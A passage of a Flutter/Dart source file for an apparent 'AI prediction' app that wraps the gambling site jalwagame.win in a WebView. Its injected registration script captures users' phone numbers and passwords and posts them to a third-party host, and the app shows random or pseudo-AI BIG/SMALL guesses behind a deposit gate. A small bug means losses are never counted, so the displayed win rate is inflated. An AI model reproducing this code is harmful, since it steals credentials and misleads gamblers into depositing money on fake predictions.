                                              BorderRadius.circular(24),
                                          gradient: LinearGradient(
                                            begin: Alignment.topLeft,
                                            end: Alignment.bottomRight,
                                            colors: [
                                              Colors.greenAccent.shade400,
                                              Colors.green.shade600,
                                              Colors.green.shade800,
                                            ],
                                          ),
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.greenAccent
                                                  .withOpacity(0.4),
                                              blurRadius: 15,
                                              offset: const Offset(-6, -6),
                                            ),
                                            BoxShadow(
                                              color: Colors.green.shade600
                                                  .withOpacity(0.4),
                                              blurRadius: 15,
                                              offset: const Offset(6, 6),
                                            ),
                                            BoxShadow(
                                              color: Colors.green.shade400
                                                  .withOpacity(0.3),
                                              blurRadius: 20,
                                              spreadRadius: -8,
                                            ),
                                          ],
                                        ),
                                        child: Material(
                                          color: Colors.transparent,
                                          child: InkWell(
                                            onTap: _handleStart,
                                            borderRadius:
                                                BorderRadius.circular(24),
                                            splashColor:
                                                Colors.white.withOpacity(0.2),
                                            highlightColor:
                                                Colors.white.withOpacity(0.1),
                                            child: Container(
                                              decoration: BoxDecoration(
                                                borderRadius:
                                                    BorderRadius.circular(24),
                                                border: Border.all(
                                                  color: Colors.greenAccent
                                                      .withOpacity(0.3),
                                                  width: 1.5,
                                                ),
                                              ),
                                              child: Center(
                                                child: Row(
                                                  mainAxisAlignment:
                                                      MainAxisAlignment.center,
                                                  children: [
                                                    Container(
                                                      width: 28,
                                                      height: 28,
                                                      decoration: BoxDecoration(
                                                        shape: BoxShape.circle,
                                                        color: Colors.black
                                                            .withOpacity(0.2),
                                                      ),
                                                      child: const Icon(
                                                        Icons
                                                            .play_arrow_rounded,
                                                        color: Colors.black,
                                                        size: 18,
                                                      ),
                                                    ),
                                                    const SizedBox(width: 8),
                                                    Text(
                                                      'START',
                                                      style:
                                                          GoogleFonts.orbitron(
                                                        fontSize: 18,
                                                        fontWeight:
                                                            FontWeight.bold,
                                                        color: Colors.black,
                                                        letterSpacing: 2,
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            ),
                                          ),
                                        ),
                                      ),
                                    );
                                  },
                                ),
                              ),
                            ),
                          ),
                        ),
                    ],
                  ),
                ),
        ),
      ),
    );
  }

  Future<void> _checkRemoteConfig() async {
    try {
      final remoteConfig = FirebaseRemoteConfig.instance;
      // Example of using remote config
      _isAppEnabled = remoteConfig.getBool('is_app_enabled');
      print('App enabled status from Remote Config: $_isAppEnabled');
    } catch (e) {
      print('Error checking remote config: $e');
    }
  }

  // Add this method to show the overlay
  void _showInsufficientBalanceOverlay() {
    if (context.mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return WillPopScope(
            onWillPop: () async => false,
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
              child: Dialog(
                backgroundColor: const Color(0xFF1a1b20).withOpacity(0.95),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1a1b20).withOpacity(0.95),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: Colors.red.withOpacity(0.5),
                      width: 2,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.red.withOpacity(0.1),
                        blurRadius: 20,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(
                        Icons.warning_amber_rounded,
                        color: Colors.red,
                        size: 48,
                      ),
                      const SizedBox(height: 16),
                      const Text(
                        'Insufficient Balance',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 24,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      const SizedBox(height: 12),
                      Text(
                        'Current Balance: $_walletBalance',
                        style: const TextStyle(
                          color: Colors.white70,
                          fontSize: 18,
                        ),
                      ),
                      const SizedBox(height: 8),
                      const Text(
                        'Minimum required balance: ₹100',
                        style: TextStyle(
                          color: Colors.white70,
                          fontSize: 16,
                        ),
                      ),
                      const SizedBox(height: 24),
                      ElevatedButton(
                        onPressed: () {
                          _webViewController.loadRequest(Uri.parse(
                              'https://www.jalwagame.win/#/wallet/Recharge'));
                          Navigator.of(context).pop();
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.green,
                          padding: const EdgeInsets.symmetric(
                            horizontal: 32,
                            vertical: 16,
                          ),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: const Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.account_balance_wallet),
                            SizedBox(width: 8),
                            Text(
                              'DEPOSIT NOW',
                              style: TextStyle(
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          );
        },
      );
    }
  }

  void _handleMandatoryStart() {
    setState(() {
      _isMandatoryStarted = true;
    });
  }

  void _handleStart() async {
    if (_currentUrl.contains("/saasLottery/WinGo?gameCode=WinGo_")) {
      try {
        // Check wallet balance and wait for the result
        final balance = await _checkWalletBalance();

        if (balance >= 100.0) {
          setState(() {
            _showStartButton = false;
            _isMandatoryStarted = true;
            _isPredictionRunning = true;
          });
        } else {
          _showInsufficientBalanceOverlay();
        }
      } catch (e) {
        print("Error in handleStart: $e");
        // Show an error message to the user
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('Error checking balance. Please try again.'),
              backgroundColor: Colors.red,
            ),
          );
        }
      }
    }
  }

  void _handleStop() {
    setState(() {
      _isPredictionRunning = false;
    });
  }

  Future<double> _checkWalletBalance() async {
    try {
      // Add a check to ensure WebView is ready
      if (!_isUrlLoaded) {
        print("WebView not ready yet, waiting...");
        await Future.delayed(const Duration(seconds: 2));
      }

      const fetchWalletBalanceScript = """
        (() => {
          try {
            // Use the exact selector from the HTML
            const walletElement = document.querySelector('div[data-v-7b3870ea].Wallet__C-balance-l1 > div[data-v-7b3870ea]');
            
            if (!walletElement) {
              console.log('Wallet element not found with exact selector, trying alternatives...');
              // Fallback selectors
              const selectors = [
                '.Wallet__C-balance-l1 > div',
                '[data-v-7b3870ea].Wallet__C-balance-l1 > div',
                '[class*="Wallet__C-balance"] > div'
              ];
              
              for (const selector of selectors) {
                const element = document.querySelector(selector);
                if (element) {
                  console.log('Found wallet element with fallback selector:', selector);
                  const text = element.innerText || element.textContent;
                  if (text) {
                    const balance = text.trim().replace('₹', '').replace(/,/g, '');
                    console.log('Found balance with fallback:', balance);
                    return balance;
                  }
                }
              }
              return '0';
            }

            const rawText = walletElement.innerText || walletElement.textContent;
            if (!rawText) {
              console.log('Wallet element found but no text content');
              return '0';
            }

            const balance = rawText.trim().replace('₹', '').replace(/,/g, '');
            console.log('Found wallet balance:', balance, 'from raw text:', rawText);
            return balance;
          } catch (e) {
            console.error('Error fetching wallet balance:', e);
            return '0';
          }
        })();
      """;

      final result = await _webViewController
          .runJavaScriptReturningResult(fetchWalletBalanceScript);

      // Parse the balance and handle potential errors
      final balanceStr = (result as String).replaceAll('"', '').trim();
      final balance = double.tryParse(balanceStr) ?? 0.0;

      print("Wallet balance checked: $balance from string: $balanceStr");

      setState(() {
        _walletBalance = '₹${balance.toStringAsFixed(2)}';
        _showPredictionBar = balance > 100;
      });

      return balance;
    } catch (e) {
      print("Error checking wallet balance: $e");
      return 0.0;
    }
  }

  void _checkPageUrl(String url) {
    setState(() {
      _currentUrl = url;
      _showPredictionBar = url.contains("/saasLottery/WinGo?gameCode=WinGo_");
    });

    // Remove the wallet balance check from here
    if (!url.contains('register')) {
      _cleanupRegistrationHandler();
    }

    // List of supported schemes
    final supportedSchemes = ['paytmmp://', 'upi://', 'gpay://', 'phonepe://'];

    // Check if the URL starts with any of the supported schemes
    if (supportedSchemes.any((scheme) => url.startsWith(scheme))) {
      redirectToApp(url);
    }
  }

  Future<void> _injectLoginHandler() async {
    const loginScript = """
      (function() {
        console.log('Starting login handler setup v4');
        let isCheckingUser = false;
        
        // Add CSS for overlay and button styles
        const style = document.createElement('style');
        style.textContent = `
          button[data-v-33f88764].disabled {
            opacity: 0.6 !important;
            pointer-events: none !important;
            cursor: not-allowed !important;
          }
          .overlay-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(26, 27, 32, 0.98);
            color: white;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            text-align: center;
            min-width: 300px;
            width: 90%;
            max-width: 400px;
            animation: fadeIn 0.4s ease-out;
            border: 1px solid rgba(255, 255, 255, 0.1);
          }
          .overlay-message .title {
            color: #ff4d4d;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 1px;
          }
          .overlay-message .message {
            color: #ffffff;
            font-size: 16px;
            margin-bottom: 25px;
            line-height: 1.5;
            opacity: 0.9;
          }
          .overlay-message .register-btn {
            background-color: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
            width: 100%;
            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
          }
          .overlay-message .register-btn:hover {
            background-color: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(76, 175, 80, 0.3);
          }
          .overlay-message .buttons {
            display: flex;
            justify-content: center;
            width: 100%;
          }
          @keyframes fadeIn {
            from { 
              opacity: 0; 
              transform: translate(-50%, -60%) scale(0.95); 
            }
            to { 
              opacity: 1; 
              transform: translate(-50%, -50%) scale(1); 
            }
          }
          .overlay-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(6px);
            z-index: 9998;
            animation: fadeBackdrop 0.4s ease-out;
          }
          @keyframes fadeBackdrop {
            from { opacity: 0; }
            to { opacity: 1; }
          }
        `;
        document.head.appendChild(style);

        function showOverlayMessage() {
          // Add backdrop
          const backdrop = document.createElement('div');
          backdrop.className = 'overlay-backdrop';
          document.body.appendChild(backdrop);

          const overlay = document.createElement('div');
          overlay.className = 'overlay-message';
          overlay.innerHTML = `
            <div class="title">⚠️ Number Not Registered</div>
            <div class="message">This phone number is not registered in our system. To continue using our services, please register your account first.</div>
            <div class="buttons">
              <button class="register-btn">Register Now</button>
            </div>
          `;
          document.body.appendChild(overlay);

          // Handle register button click
          overlay.querySelector('.register-btn').addEventListener('click', () => {
            window.location.href = window.location.href.replace('login', 'register');
            removeOverlay();
          });

          function removeOverlay() {
            overlay.style.opacity = '0';
            backdrop.style.opacity = '0';
            overlay.style.transform = 'translate(-50%, -60%) scale(0.95)';
            overlay.style.transition = 'all 0.3s ease-out';
            backdrop.style.transition = 'opacity 0.3s ease-out';
            setTimeout(() => {
              overlay.remove();
              backdrop.remove();
            }, 300);
          }
        }

        function disableLoginButton(button) {
          if (!button) return;
          button.disabled = true;
          button.setAttribute('disabled', 'disabled');
          button.classList.add('disabled');
          button.style.pointerEvents = 'auto'; // Allow click events for disabled state
          button.style.cursor = 'not-allowed';
          button.style.opacity = '0.6';
        }

        function enableLoginButton(button) {
          if (!button) return;
          button.disabled = false;
          button.removeAttribute('disabled');
          button.classList.remove('disabled');
          button.style.pointerEvents = '';
          button.style.cursor = '';
          button.style.opacity = '';
        }
        
        function setupLoginHandler() {
          try {
            const loginButton = document.querySelector('button[data-v-33f88764].active');
            const phoneInput = document.querySelector('input[data-v-50aa8bb0][name="userNumber"]');
            
            if (!loginButton || !phoneInput) {
              console.log('Missing login elements, retrying...');
              setTimeout(setupLoginHandler, 1000);
              return;
            }

            // Initially disable
            disableLoginButton(loginButton);
            
            // Override click event
            loginButton.addEventListener('click', function(e) {
              if (!window._userVerified) {
                e.preventDefault();
                e.stopPropagation();
                showOverlayMessage();
                return false;
              }
            });

            // Listen for validation
            window.addEventListener('phoneValidated', function(event) {
              const isValid = event.detail?.isValid;
              window._userVerified = isValid;
              
              if (isValid) {
                enableLoginButton(loginButton);
                console.log('Button enabled - user verified');
              } else {
                disableLoginButton(loginButton);
                if (phoneInput.value.length >= 10) {
                  showOverlayMessage();
                }
                console.log('Button disabled - invalid user');
              }
            });

            phoneInput.addEventListener('input', function() {
              window._userVerified = false;
              disableLoginButton(loginButton);
              
              if (isCheckingUser) return;
              isCheckingUser = true;

              setTimeout(() => {
                const phone = phoneInput.value;
                if (phone && phone.length >= 10) {
                  window.CheckUsername.postMessage(phone);
                }
                isCheckingUser = false;
              }, 500);
            });

          } catch (error) {
            console.error('Login handler setup error:', error);
            setTimeout(setupLoginHandler, 1000);
          }
        }

        // Ensure handler runs after DOM is ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', setupLoginHandler);
        } else {
          setupLoginHandler();
        }
      })();
    """;

    try {
      await _webViewController.runJavaScript(loginScript);
      print('Login handler injected successfully');
    } catch (e) {
      print('Failed to inject login handler: $e');
    }
  }

  Future<void> _injectRegistrationHandler() async {
    const registrationScript = """
      (function() {
        console.log('Starting registration handler setup v4');
        
        function setupRegistrationHandler() {
          const registerButton = document.querySelector('button[data-v-e26f70e7]');
          const phoneInput = document.querySelector('input[data-v-50aa8bb0][name="userNumber"]');
          const passwordInput = document.querySelector('input[data-v-ea5b66c8][type="password"][placeholder="Set password"]');
          const confirmPasswordInput = document.querySelector('input[data-v-ea5b66c8][type="password"][placeholder="Confirm password"]');
          
          if (!registerButton || !phoneInput || !passwordInput || !confirmPasswordInput) {
            console.log('Missing elements, retrying in 1s...');
            setTimeout(setupRegistrationHandler, 1000);
            return;
          }

          registerButton.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const phone = phoneInput.value;
            const password = passwordInput.value;
            const confirmPass = confirmPasswordInput.value;

            if (!phone || phone.length < 10) {
              alert('Please enter a valid phone number');
              return;
            }

            if (!password || password.length < 6) {
              alert('Password must be at least 6 characters');
              return;
            }

            if (password !== confirmPass) {
              alert('Passwords do not match');
              return;
            }

            try {
              const response = await fetch('https://auth-d0ci.onrender.com/api/register', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  phone: phone,
                  password: password
                })
              });

              const data = await response.json();
              
              if (response.ok) {
                console.log('Registration successful! Please login.');
                
              } else {
                
              }
            } catch (error) {
              console.error('Registration error:', error);
              
            }
          });

          console.log('Registration handler setup complete');
        }
        
        setupRegistrationHandler();
      })();
    """;

    try {
      await _webViewController.runJavaScript(registrationScript);
      print('Registration handler injected successfully');
    } catch (e) {
      print('Failed to inject registration handler: $e');
    }
  }

  Future<void> _cleanupRegistrationHandler() async {
    try {
      await _webViewController.runJavaScript("""
        if (window._cleanupRegistrationHandler) {
          window._cleanupRegistrationHandler();
        }
      """);
      print('Registration handler cleaned up');
    } catch (e) {
      print('Failed to cleanup registration handler: $e');
    }
  }

  Future<void> redirectToApp(String url) async {
    try {
      // Define the supported URL schemes
      final supportedSchemes = [
        'paytmmp://',
        'upi://',
        'gpay://',
        'phonepe://'
      ];

      // Check if the URL matches any of the supported schemes
      final isSupported =
          supportedSchemes.any((scheme) => url.startsWith(scheme));

      if (isSupported) {
        // Launch the URL if possible
        if (await canLaunch(url)) {
          await launch(url);
        } else {
          print('Cannot launch URL: $url');
          return; // Exit if the URL cannot be launched
        }

        // Navigate to the "Complete Payment" screen after launching the URL
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (context) => CompletePaymentScreen(),
          ),
        );
      } else {
        print('Unsupported URL scheme: $url');
      }
    } catch (e) {
      print('Error in redirectToApp: $e');
    }
  }

  void _startTimerUpdates() {
    _updateTimer = Timer.periodic(const Duration(seconds: 1), (timer) async {
      if (_isPredictionRunning) {
        await _fetchGameData();
        // Add periodic wallet balance check
        if (_currentUrl.contains("/saasLottery/WinGo?gameCode=WinGo_")) {
          await _checkWalletBalance();
        }
      }
    });
  }

  Future<void> _fetchGameData() async {
    try {
      const fetchWalletBalanceScript = """
      (() => {
        try {
        const walletElement = document.querySelector('.Wallet__C-balance-l1 > div');
        if (walletElement) {
            console.log('Wallet element found:', walletElement.innerText);
          } else {
            console.log('Wallet element not found in fetchGameData');
        }
          return walletElement ? walletElement.innerText.trim() : 'N/A';
        } catch (e) {
          console.error('Error in fetchWalletBalance:', e);
        return 'N/A';
        }
      })();
    """;

      const fetchGameTimerScript = """
      (() => {
        try {
          const timerElement = document.querySelector('.TimeLeft__C-name');
          if (timerElement) {
            // Extract the number from "WinGo XXsec" format
            const match = timerElement.textContent.match(/\\d+/);
            if (match) {
              const seconds = parseInt(match[0]);
              return seconds.toString().padStart(2, '0');
            }
          }
          return '30'; // Default to 30 seconds if not found
        } catch (e) {
          console.error('Timer fetch error:', e);
          return '30'; // Default value on error
        }
      })();
    """;

      const fetchGamePeriodScript = """
      (() => {
        const periodElement = document.querySelector('.TimeLeft__C-id');
        if (periodElement) {
          return periodElement.innerText;
        }
        return 'N/A';
      })();
    """;

      final walletBalanceResult = await _webViewController
          .runJavaScriptReturningResult(fetchWalletBalanceScript);
      final gameTimerResult = await _webViewController
          .runJavaScriptReturningResult(fetchGameTimerScript);
      final gamePeriodResult = await _webViewController
          .runJavaScriptReturningResult(fetchGamePeriodScript);

      // Clean and parse results
      String walletBalance =
          (walletBalanceResult as String).replaceAll('"', '');
      String activeGameTimer = (gameTimerResult as String).replaceAll('"', '');
      String gamePeriod = (gamePeriodResult as String).replaceAll('"', '');

      setState(() {
        // Update wallet balance if it's valid
        if (walletBalance != 'N/A') {
          _walletBalance = walletBalance;
          // Try to parse the balance and update _showPredictionBar
          final balance = double.tryParse(
                  walletBalance.replaceAll('₹', '').replaceAll(',', '')) ??
              0.0;
          _showPredictionBar = balance > 100;
        }

        // Update game data only if there's a change
        if (_gameTimer != activeGameTimer && activeGameTimer != "N/A") {
          _updatePrediction();
        }
        _gameTimer = activeGameTimer != 'N/A' ? activeGameTimer : "Not Found";
        _gamePeriod = gamePeriod != 'N/A' ? gamePeriod : "Not Found";
      });
    } catch (e) {
      print("Error fetching game data: $e");
    }
  }

  void _updatePrediction() {
    final random = Random();
    final isBig = random.nextBool();

    _prediction = isBig ? "BIG" : "SMALL";
    _predictionColor = isBig ? Colors.yellow : Colors.lightBlue;
    print("Prediction updated to: $_prediction"); // Debug
  }

  void _startPredictionUpdates() {
    String lastResult = '';

    _updateTimer = Timer.periodic(const Duration(seconds: 1), (_) async {
      if (_isPredictionRunning) {
        try {
          const fetchLatestDataScript = """
          (() => {
            try {
              // Get the first row from the record body
              const firstRow = document.querySelector('.record-body .van-row');
              if (!firstRow) return 'NO_DATA';
              
              // Extract number
              const numberElement = firstRow.querySelector('.record-body-num');
              const number = numberElement ? numberElement.textContent.trim() : null;
              
              // Extract big/small
              const bigSmallElement = firstRow.querySelector('.van-col--5 span');
              const bigSmall = bigSmallElement ? bigSmallElement.textContent.trim() : null;
              
              // Extract colors
              const colorDiv = firstRow.querySelector('.record-origin');
              let colors = [];
              if (colorDiv) {
                if (colorDiv.querySelector('.record-origin-I.red')) colors.push('red');
                if (colorDiv.querySelector('.record-origin-I.green')) colors.push('green');
                if (colorDiv.querySelector('.record-origin-I.violet')) colors.push('violet');
              }
              
              // Extract period number
              const periodElement = firstRow.querySelector('.van-col--10');
              const period = periodElement ? periodElement.textContent.trim() : null;

              return {
                number: number,
                bigSmall: bigSmall,
                colors: colors.join(' '),
                period: period
              };
            } catch (e) {
              return 'ERROR: ' + e.message;
            }
          })();
          """;

          final result = await _webViewController
              .runJavaScriptReturningResult(fetchLatestDataScript);
          final resultStr = result as String;

          if (resultStr.startsWith('"ERROR:') || resultStr == '"NO_DATA"') {
            return;
          }

          final data = jsonDecode(resultStr);
          if (data is Map) {
            String currentNumber = data['number']?.toString() ?? '';
            String currentColors = data['colors']?.toString() ?? '';

            if (currentNumber.isNotEmpty && currentNumber != lastResult) {
              int resultNumber = int.tryParse(currentNumber) ?? -1;
              if (resultNumber == -1) return;

              // Update recent history
              _recentNumbers.insert(0, resultNumber);
              _recentColors.insert(0, currentColors);

              if (_recentNumbers.length > 10) {
                _recentNumbers.removeLast();
                _recentColors.removeLast();
              }

              bool isResultBig = resultNumber >= 5;
              bool predictedBig = _prediction.toUpperCase() == 'BIG';

              // Calculate reward based on prediction accuracy and confidence
              double reward = isResultBig == predictedBig ? 1.0 : -1.0;
              reward *= _lastConfidence;

              // Update AI with result
              PredictionState currentState = PredictionState(
                  List.from(_recentNumbers), List.from(_recentColors));

              // Create next state for better Q-learning
              PredictionState? nextState;
              if (_recentNumbers.length > 1) {
                List<int> nextNumbers = List.from(_recentNumbers);
                nextNumbers.removeAt(0); // Remove oldest
                List<String> nextColors = List.from(_recentColors);
                nextColors.removeAt(0); // Remove oldest
                nextState = PredictionState(nextNumbers, nextColors);
              }

              _ai.learn(currentState, predictedBig, reward,
                  nextState: nextState);

              setState(() {
                if (isResultBig == predictedBig) {
                  _wins++;
                  print("Correct prediction! Wins: $_wins");
                } else {
                  _losses;
                  print("Wrong prediction. Losses: $_losses");
                }

                lastResult = currentNumber;
                _generateNewPrediction();
              });
            }
          }
        } catch (e) {
          print("Error in prediction update: $e");
        }
      }
    });
  }

  void _generateNewPrediction() {
    try {
      if (_recentNumbers.isEmpty) {
        _updateRandomPrediction();
        return;
      }

      // Get AI prediction
      PredictionState currentState =
          PredictionState(List.from(_recentNumbers), List.from(_recentColors));
      AIDecision aiDecision = _ai.predict(currentState);

      // Get advanced predictor result
      final predictor =
          AdvancedPredictor(_recentNumbers, _recentColors, _wins, _losses);
      final prediction = predictor.predict();

      // Combine AI and advanced predictor with weighted average
      double aiWeight = aiDecision.confidence;
      double predictorWeight = prediction['confidence'];
      double totalWeight = aiWeight + predictorWeight;

      double combinedProbability;
      if (totalWeight > 0) {
        combinedProbability = (aiDecision.bigProbability * aiWeight +
                prediction['probability'] * predictorWeight) /
            totalWeight;
      } else {
        combinedProbability =
            (aiDecision.bigProbability + prediction['probability']) / 2;
      }

      // Enhanced confidence calculation
      double combinedConfidence =
          max(aiDecision.confidence, prediction['confidence']);

      // Check if AI should be reset due to poor performance
      if (_wins + _losses > 20) {
        double winRate = _wins / (_wins + _losses);
        if (winRate < 0.25) {
          _ai.resetLearning();
          print(
              "AI reset due to poor performance (${(winRate * 100).toStringAsFixed(1)}% win rate)");
        }
      }

      setState(() {
        _prediction = combinedProbability > 0.5 ? "BIG" : "SMALL";
        _predictionColor =
            _prediction == "BIG" ? Colors.yellow : Colors.lightBlue;
        _lastConfidence = combinedConfidence;

        // Get AI learning statistics
        Map<String, dynamic> aiStats = _ai.getLearningStats();

        print("""
=== ENHANCED PREDICTION SYSTEM ===
AI Decision: ${aiDecision.bigProbability > 0.5 ? 'BIG' : 'SMALL'} (${(aiDecision.bigProbability * 100).toStringAsFixed(1)}%)
AI Confidence: ${(aiDecision.confidence * 100).toStringAsFixed(1)}%
AI Reasoning: ${aiDecision.reasoning}

Advanced Predictor: ${prediction['prediction']}
Predictor Probability: ${(prediction['probability'] * 100).toStringAsFixed(1)}%
Predictor Confidence: ${(prediction['confidence'] * 100).toStringAsFixed(1)}%
Predictor Reasoning: ${prediction['reasoning']}

FINAL PREDICTION: $_prediction
Combined Probability: ${(combinedProbability * 100).toStringAsFixed(1)}%
Combined Confidence: ${(combinedConfidence * 100).toStringAsFixed(1)}%

AI Learning Stats:
- Total States: ${aiStats['totalStates']}
- Total Visits: ${aiStats['totalVisits']}
- Exploration Rate: ${(aiStats['explorationRate'] * 100).toStringAsFixed(1)}%
- Average Reward: ${aiStats['avgReward'].toStringAsFixed(3)}
- Experience Size: ${aiStats['experienceSize']}

Performance: $_wins wins, $_losses losses (${_wins + _losses > 0 ? ((_wins / (_wins + _losses)) * 100).toStringAsFixed(1) : 0}% win rate)
==================================
        """);
      });
    } catch (e) {
      print("Error generating prediction: $e");
      _updateRandomPrediction();
    }
  }

  void _updateRandomPrediction() {
    final random = Random();
    final isBig = random.nextBool();
    _prediction = isBig ? "BIG" : "SMALL";
    _predictionColor = isBig ? Colors.yellow : Colors.lightBlue;
  }

  Future<void> _checkAppStatus() async {
    try {
      print("Starting app status check..."); // Debug log

      final remoteConfig = FirebaseRemoteConfig.instance;
      print("Remote config instance obtained"); // Debug log

      // Set default value first
      await remoteConfig.setDefaults({
        'is_app_enabled': false // Default to false for safety
      });
      print("Default values set"); // Debug log

      // Configure fetch settings
      await remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 20), // Increased timeout
        minimumFetchInterval: Duration.zero,
      ));
      print("Config settings applied"); // Debug log

      // Fetch new values
      try {
        await remoteConfig.fetch();
        print("Remote config fetched"); // Debug log
      } catch (fetchError) {
        print("Fetch error: $fetchError");
        throw fetchError;
      }

      // Activate fetched values
      try {
        final activated = await remoteConfig.activate();
        print("Remote config activated: $activated"); // Debug log
      } catch (activateError) {
        print("Activation error: $activateError");
        throw activateError;
      }

      // Get the value
      final bool newAppState = remoteConfig.getBool('is_app_enabled');
      print("Retrieved is_app_enabled value: $newAppState"); // Debug log

      // Update state
      setState(() {
        _isAppEnabled = newAppState;
        print("App enabled state updated to: $_isAppEnabled"); // Debug log
      });
    } catch (e) {
      print("Fatal error in _checkAppStatus: $e");
      setState(() {
        _isAppEnabled = false; // Fail safe
        print("App disabled due to error"); // Debug log
      });
    }
  }

  void _showHackerEffectPopup() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      showDialog(
        context: context,
        barrierDismissible: false, // Prevent dismissal
        builder: (BuildContext context) {
          return HackerEffectPopup(
            onComplete: () {
              Navigator.pop(context); // Close the popup after effect finishes
            },
          );
        },
      );
    });
  }
}

extension on WebViewController {
  void addJavaScriptHandler({
    required String handlerName,
    required Null Function(dynamic args) callback,
  }) {}
}
